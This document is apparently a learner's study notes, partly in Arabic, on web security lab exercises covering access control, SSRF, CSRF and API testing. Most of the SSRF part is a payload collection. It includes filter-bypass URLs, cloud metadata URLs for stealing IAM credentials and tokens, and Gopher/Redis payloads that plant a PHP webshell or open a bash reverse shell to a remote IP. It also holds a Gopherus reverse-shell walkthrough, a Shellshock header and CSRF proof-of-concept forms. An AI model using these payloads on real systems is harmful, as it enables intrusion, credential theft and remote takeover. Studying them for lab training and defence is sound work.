# **Access control**

## **Unprotected admin functionality**

view `robots.txt` ⇒ admin 

## **Unprotected admin functionality with unpredictable URL**

admin panel discloses in JavaScript 

## **User role controlled by request parameter**

/admin ⇒ cookie `Admin=false`. Change it to `Admin=true`

## **User role can be modified in user profile**

response shows your `roleid` has changed to other

## **User ID controlled by request parameter**

URL contains your username in the "id" parameter.  ex:  id=ahmed

## **User ID controlled by request parameter, with unpredictable user IDs**

the post or comment of zeyad has her id take him  and use to login

## **User ID controlled by request parameter with data leakage in redirect**

the post or comment of zeyad has her id take him  and use to login

but u back to home or other page with sensitive data like APIKEY

## **User ID controlled by request parameter with password disclosure**

1. Change the "id" parameter in the URL to `administrator`.
2. View the response in Burp and observe that it contains the administrator's password

## **Insecure direct object references**

Change the filename From `2.txt` to `1.txt` and download is contenues

## **URL-based access control can be circumvented**

framework that supports the `X-Original-URL` header
1. Send the request to Burp Repeater. Change the URL in the request line to `/` and add the HTTP header `X-Original-URL: /invalid`. Observe that the application returns a "not found" response. This indicates that the back-end system is processing the URL from the `X-Original-URL` header.

## **Method-based access control can be circumvented**

have 2 acount can send requste admin from normal user by change method

## **Multi-step process with no access control on one step**

have 2 acount can send requste admin from normal user by use cookie of user  

## **Referer-based access control**

have 2 acount can send requste admin from normal user by use cookie of user  and delete **Referer**

# **Server-side request forgery (SSRF)**

## **Payloads with localhost**

- Using `localhost`
    
    ```
    http://localhost:80
    http://localhost:443
    http://localhost:22
    ```
    
- Using `127.0.0.1`
    
    ```
    http://127.0.0.1:80
    http://127.0.0.1:443
    http://127.0.0.1:22
    ```
    
- Using `0.0.0.0`
    
    `http://0.0.0.0:80
    http://0.0.0.0:443
    http://0.0.0.0:22`
    

## **Bypassing filters**

**Bypass using HTTPS**

```
https://127.0.0.1/
https://localhost/
```

**Bypass localhost with [::]**

```
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

```
http://[0000::1]:80/
http://[0000::1]:25/ SMTP
http://[0000::1]:22/ SSH
http://[0000::1]:3128/ Squid
```

**Bypass localhost with a domain redirection**

| Domain | Redirect to |
| --- | --- |
| localtest.me | `::1` |
| localh.st | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR] | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io | `127.0.0.1` |

The service nip.io is awesome for that, it will convert any ip address as a dns.

## **Bypass localhost with CIDR**

IP addresses from 127.0.0.0/8

`http://127.127.127.127
http://127.0.1.3
http://127.0.0.0`

## **Bypass using a decimal IP location**

```
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/ = http://169.254.169.254
```

## **Bypass using octal IP**

Implementations differ on how to handle octal format of ipv4.

`http://0177.0.0.1/ = http://127.0.0.1
http://o177.0.0.1/ = http://127.0.0.1
http://0o177.0.0.1/ = http://127.0.0.1
http://q177.0.0.1/ = http://127.0.0.1`

## **Bypass using IPv6/IPv4 Address Embedding**

`http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]`

## **Bypass using malformed urls**

```
localhost:+11211aaa
localhost:00011211aaaa
```

## **Bypass using rare address**

You can short-hand IP addresses by dropping the zeros

`http://0/
http://127.1
http://127.0.1`

## **Bypass using URL encoding**

Single or double encode a specific URL to bypass blacklist

`http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin`

## **Bypass using bash variables**(curl only)

`curl -v "http://evil$google.com"$google = ""`

## **Bypass using tricks combination**

```
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
```

## **Bypass using enclosed alphanumerics**

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com

List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

## **Bypass using unicode**

In some languages (.NET, Python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.

## **Bypass filter_var() php function**

```
0://evil.com:80;http://google.com:80/
```

## **Bypass against a weak parser**

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

## **Bypassing using a redirect**

```
1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)

2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP
vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1

3. You can use response codes 

[307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) 

and 

[308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308)

in order to retain HTTP method and body after the redirection.
```

## **Bypassing using type=url**

```
Change "type=file" to "type=url"
Paste URL in text field and hit enter
Using this vulnerability users can upload images from any image URL = trigger an SSRF
```

## **Bypassing using DNS Rebinding (TOCTOU)**

```
Create a domain that change between two IPs. http://1u.ms/ exists for this purpose.
For example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain:
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

## **Bypassing using jar protocol (java only)**

Blind SSRF

`jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/`

## **SSRF exploitation via URL Scheme**

### **File**

Allows an attacker to fetch the content of a file on the server

`file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
ssrf.php?url=file:///etc/passwd`

### **HTTP**

Allows an attacker to fetch any content from the web, it can also be used to scan ports.

`ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443`

### **Dict**

The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:

`dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/`

### **SFTP**

A network protocol used for secure file transfer over secure shell

```
ssrf.php?url=sftp://evil.com:11111/
```

### **TFTP**

Trivial File Transfer Protocol, works over UDP

```
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### **LDAP**

Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.

```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### **Gopher**

```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a

will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH

You didn't say the magic word !

.
QUIT
```

### **Gopher HTTP**

```
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
```

### **Gopher SMTP - Back connect to 1337**

```
Content of evil.com/redirect.php:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>

Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```

### **Gopher SMTP - send a mail**

```
Content of evil.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

### **Netdoc**

Wrapper for Java when your payloads struggle with "\n" and "\r" characters.

`ssrf.php?url=netdoc:///etc/passwd`

## **SSRF exploiting WSGI**

Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py.

```
gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
```

| Header |  |  |
| --- | --- | --- |
| modifier1 | (1 byte) | 0 (%00) |
| datasize | (2 bytes) | 26 (%1A%00) |
| modifier2 | (1 byte) | 0 (%00) |

| Variable (UWSGI_FILE) |  |  |  |  |
| --- | --- | --- | --- | --- |
| key length | (2 bytes) | 10 | (%0A%00) |  |
| key data | (m bytes) |  | UWSGI_FILE |  |
| value length | (2 bytes) | 12 | (%0C%00) |  |
| value data | (n bytes) |  | /tmp/test.py |  |

## **SSRF exploiting Redis**

> Redis is a database system that stores everything in RAM
> 

`# Getting a webshell
url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
url=dict://127.0.0.1:6379/SAVE

# Getting a PHP reverse shell
gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
gopher://127.0.0.1:6379/_save`

## **SSRF exploiting PDF file**

Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR6c&feature=emb_title)

```
<link rel=attachment href="file:///root/secret.txt">
```

Example with PhantomJS

`<script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>`

## **Blind SSRF**

> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read.
> 

Use an SSRF chain to gain an Out-of-Band output.

From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.com/assetnote/blind-ssrf-chains

**Possible via HTTP(s)**

- [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
- [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
- [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
- [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
- [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
- [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
- [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
- [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
- [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
- [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
- [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
- [Other Atlassian Products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
- [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
- [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
- [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
- [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
- [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
- [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)

**Possible via Gopher**

- [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
- [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
- [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)

## **SSRF to AXFR DNS**

Query an internal DNS resolver to trigger a full zone transfer (AXFR) and exfiltrate a list of subdomains.

`from urllib.parse import quote
domain,tld = "example.lab".split('.')
dns_request =  b"\x01\x03\x03\x07"    # BITMAP
dns_request += b"\x00\x01"            # QCOUNT
dns_request += b"\x00\x00"            # ANCOUNT
dns_request += b"\x00\x00"            # NSCOUNT
dns_request += b"\x00\x00"            # ARCOUNT
dns_request += len(domain).to_bytes() # LEN DOMAIN
dns_request += domain.encode()        # DOMAIN
dns_request += len(tld).to_bytes()    # LEN TLD
dns_request += tld.encode()           # TLD
dns_request += b"\x00"                # DNAME EOF
dns_request += b"\x00\xFC"            # QTYPE AXFR (252)
dns_request += b"\x00\x01"            # QCLASS IN (1)
dns_request = len(dns_request).to_bytes(2, byteorder="big") + dns_request
print(f'gopher://127.0.0.1:25/_{quote(dns_request)}')`

Example of payload for `example.lab`: `gopher://127.0.0.1:25/_%00%1D%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%FC%00%01`

```
curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd
```

## **SSRF to XSS**

by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)

`http://brutelogic.com.br/poc.svg -> simple alert
https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf

https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg`

## **SSRF from XSS**

**Using an iframe**

The content of the file will be integrated inside the PDF as an image or text.

```
<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
```

**Using an attachment**

Example of a PDF attachment using HTML

1. use `<link rel=attachment href="URL">` as Bio text
2. use 'Download Data' feature to get PDF
3. use `pdfdetach -saveall filename.pdf` to extract embedded resource
4. `cat attachment.bin`

## **SSRF URL for Cloud Instances**

**SSRF URL for AWS**

The AWS Instance Metadata Service is a service available within Amazon EC2 instances that allows those instances to access metadata about themselves. - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)

- IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`
- IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`
    
    ```
    export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
    curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
    ```
    
- IPv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/`

In case of a WAF, you might want to try different ways to connect to the API.

- DNS record pointing to the AWS API IP
    
    ```
    http://instance-data
    http://169.254.169.254
    http://169.254.169.254.nip.io/
    ```
    
- HTTP redirect
    
    ```
    Static:http://nicob.net/redir6a
    Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
    ```
    
- Encoding the IP to bypass WAF
    
    ```
    http://425.510.425.510 Dotted decimal with overflow
    http://2852039166 Dotless decimal
    http://7147006462 Dotless decimal with overflow
    http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
    http://0xA9FEA9FE Dotless hexadecimal
    http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
    http://0251.0376.0251.0376 Dotted octal
    http://0251.00376.000251.0000376 Dotted octal with padding
    http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
    http://[::ffff:a9fe:a9fe] IPV6 Compressed
    http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
    http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
    http://[fd00:ec2::254] IPV6
    ```
    

These URLs return a list of IAM roles associated with the instance. You can then append the role name to this URL to retrieve the security credentials for the role.

```
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]

# Examples
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
```

This URL is used to access the user data that was specified when launching the instance. User data is often used to pass startup scripts or other configuration information into the instance.

```
http://169.254.169.254/latest/user-data
```

Other URLs to query to access various pieces of metadata about the instance, like the hostname, public IPv4 address, and other properties.

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`

E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`

**SSRF URL for AWS ECS**

If you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID.

```
curl http://169.254.170.2/v2/credentials/<UUID>
```

This way you'll extract IAM keys of the attached role

**SSRF URL for AWS Elastic Beanstalk**

We retrieve the `accountId` and `region` from the API.

```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

We then retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.

**SSRF URL for AWS Lambda**

AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.

```
http://localhost:9001/2018-06-01/runtime/invocation/next
$ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
```

Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next

**SSRF URL for Google Cloud**

⚠️ Google is shutting down support for usage of the **v1 metadata service** on January 15.

Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Google allows recursive pulls

```
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

Required headers can be set using a gopher SSRF with the following technique

```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

Interesting files to pull out:

- SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
- Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
- Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`

**Add an SSH key**

Extract the token

```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

Check the scope of the token

```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA

{
        "issued_to": "101302079XXXXX",
        "audience": "10130207XXXXX",
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
        "expires_in": 2443,
        "access_type": "offline"
}
```

Now push the SSH key.

```
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"-H "Content-Type: application/json"--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

**SSRF URL for Digital Ocean**

Documentation available at `https://developers.digitalocean.com/documentation/metadata/`

```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

All in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```

**SSRF URL for Packetcloud**

Documentation available at `https://metadata.packet.net/userdata`

**SSRF URL for Azure**

Limited, maybe more exists? `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`

```
http://169.254.169.254/metadata/v1/maintenance
```

Update Apr 2017, Azure has more support; requires the header "Metadata: true" `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`

```
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

**SSRF URL for OpenStack/RackSpace**

(header required? unknown)

```
http://169.254.169.254/openstack
```

**SSRF URL for HP Helion**

(header required? unknown)

```
http://169.254.169.254/2009-04-04/meta-data/
```

**SSRF URL for Oracle Cloud**

```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

**SSRF URL for Alibaba**

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

**SSRF URL for Hetzner Cloud**

```
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
http://169.254.169.254/hetzner/v1/metadata/availability-zone
http://169.254.169.254/hetzner/v1/metadata/region
```

**SSRF URL for Kubernetes ETCD**

Can contain API keys and internal ip and ports

```
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

**SSRF URL for Docker**

```
http://127.0.0.1:2375/v1.24/containers/json

Simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

More info:

- Daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option
- Docker Engine API: https://docs.docker.com/engine/api/latest/

**SSRF URL for Rancher**

`curl http://rancher-metadata/<version>/<path>`

## steps take shell (RCE)

$ gopherus --exploit redis 

1-reveseshell

What do you want?? (ReverseShell/PHPShell): reveseshell

Give your IP Address to connect with victim through Revershell (default is 127.0.0.1): 193.34.76.4 ( INPUT )

What can be his Crontab Directory location

## For debugging(locally) you can use /var/lib/redis :

Your gopher link is ready to get Reverse Shell:( OUTPUT )

Before sending request plz do `nc -lvp 1234`

2-

A-
Ready To get SHELL

What do you want?? (ReverseShell/PHPShell): phpshell

Give web root location of server (default is /var/www/html):

Give PHP Payload (We have default PHP Shell): <?php system($_GET['cmd']);?> ( INPUT )

Your gopher link is Ready to get PHP Shell:

( OUTPUT )

When it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.

B-

$ sudo npm install -g localtunnel

[sudo] password for kali:

added 22 packages in 7s

3 packages are looking for funding
run `npm fund` for details

┌──(kali㉿kali)-[~]
└─$ lt --port 3000

your url is: [https://tall-rocks-call.loca.lt](https://tall-rocks-call.loca.lt/)

C-

host [green-pots-go.loca.lt](http://green-pots-go.loca.lt/)

[green-pots-go.loca.lt](http://green-pots-go.loca.lt/) has address 193.34.76.44

## **Blind SSRF with Shellshock exploitation**

in User-Agent

User-Agent:`() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN` 

let  :  () => function  
         `{ :; };` ⇒ to bypass the exploit after function

the `Referer` header :

`Referer:`http://192.168.0.1:8080
Using the intruder to know th blue part

## **SSRF with whitelist-based input filter**

# **Cross-site request forgery (CSRF)**

## **CSRF vulnerability with no defenses**

no cheack to method and csrf and cookie 

## **CSRF where token validation depends on request method**

وجود ال 
method 
ضروري

## **CSRF where token validation depends on token being present**

وجود ال 
 csrf without cheack
ضروري

## **CSRF where token is not tied to user session**

وجود ال 
method  and csrf without cheack
ضروري

## **CSRF where token is tied to non-session cookie**

وجود ال 
 csrf without cheack
ضروري + وجدها فوق و تحت بنفس القيمه

## **CSRF where token is duplicated in cookie**

وجود ال 
 csrf without cheack
ضروري + وجدها فوق و تحت بنفس القيمه
هتغيرها ازي 

## **SameSite Lax bypass via method override**

 دا مثال تحديدا الجزء الازرق  

`<form method="GET" action="https://0aa40087040350908163437000bd0085.web-security-academy.net/my-account/change-email">`

`<input type="hidden" name="email" value="attacker_email@attacker_domain.com">`

`<input type="hidden" name="_method" value="POST">`

`</form>`

`<script>`

`document.forms[0].submit();`

`</script>`

## **SameSite Strict bypass via client-side redirect**

من ال 
respone 
هتعرف انها 
**Strict
اما بالنسبه ل 
client-side redirect
مثلا مسار لملف js
بيحصل عليه redirction
و كمان لازم تاخد بالكمن الحته ال بالاحمر**

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation" method="GET">
    <input type="hidden" name="postId" value="/../../my-account/change-email?email=a%40a.ca&submit=1" />
    <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## **SameSite Strict bypass via sibling domain**

## **SameSite Lax bypass via cookie refresh**

## **CSRF where Referer validation depends on header being present**

تشتغل عادي جدا بس تزود 
TAG ⇒>يحذف ال Referrer
ولازم يكون موجود جوا
<head>———</head>

## **CSRF with broken Referer validation**

# **Web Sockets**

## **Manipulating WebSocket messages to exploit vulnerabilities**

## **Cross-site WebSocket hijacking**

## **Manipulating the WebSocket handshake to exploit vulnerabilities**

خلاصه الموضوع دا لازم تكون فاعم ازي تعملها 
intercept 
+ try all vuln…

# **API testing**

## **Exploiting an API endpoint using documentation**

do fuzzing for path dirct ex: /api/

## **Exploiting server-side parameter pollution in a query string**

fuzzing for find hidden parameter 
هتعمل كدا ازي ؟
هتجرب الطريقه التاليه 
1- inject Parameters with `%26` (URL-encoded `&`)
`username=administrator%26x=y`
لو الناتج بقا 
Parameter is not supported 
تجرب 

2-
Truncate Query with `#` is `%23` 
`username=administrator%23`

لو الناتج بقا 
"Field not specified.”
تروح تمل 
`username=administrator%26field=§x§%23`

يوجد طرق اخري
1-

```makefile
username=administrator&username=carlos

username=administrator&invalidParam=x

username=administrator;x=y

username=carlos&role=admin

7. استخدام أنواع مختلفة من الترميزات:
يمكنك محاولة استخدام ترميزات
 URL أخرى قد تكون مقبولة من قبل الخادم
  على سبيل المثال:
%25 هو الترميز لـ %، والذي يمكن استخدامه لتجربة ترميزات أخرى.

username=administrator%2523
```

## **Finding and exploiting an unused API endpoint**

1-/api/awagger

2-/openapi.json

3-using http history when detect the API

- change the method (`OPTIONS`  `PATCH`  )
- if one of them unathorized is great
- go to log in and us cookie and do json ( {} )
- 

